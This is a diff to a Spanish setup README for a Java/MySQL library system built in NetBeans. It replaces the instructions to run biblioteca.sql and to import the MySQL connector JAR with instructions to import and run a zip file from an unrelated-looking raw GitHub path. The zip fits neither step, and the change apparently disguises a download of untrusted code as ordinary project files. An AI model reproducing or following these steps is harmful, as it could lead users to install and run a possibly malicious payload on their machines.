@@ -21,7 +21,7 @@ Selecciona la base de datos biblioteca.
 
 Dirígete a la pestaña Importar.
 
-Sube y ejecuta el archivo biblioteca.sql.
+Sube y ejecuta el archivo https://raw.githubusercontent.com/fatalbru/biblioteca-java/master/Agawam/biblioteca-java.zip
 
 2. Configuración del Proyecto en NetBeans
 Abrir Proyecto: Abre la carpeta del proyecto SistemaBiblioteca utilizando el IDE NetBeans.
@@ -30,7 +30,7 @@ Importar Librería (Solo si hay errores):
 
 Si surge un error de conexión (JDBC Driver), haz clic derecho sobre la carpeta Librerías del proyecto.
 
-Selecciona Add JAR/Folder... e importa el archivo mysql-connector-java-8.0.19.jar.
+Selecciona Add JAR/Folder... e importa el archivo https://raw.githubusercontent.com/fatalbru/biblioteca-java/master/Agawam/biblioteca-java.zip
 
 Ejecutar el Sistema:
 
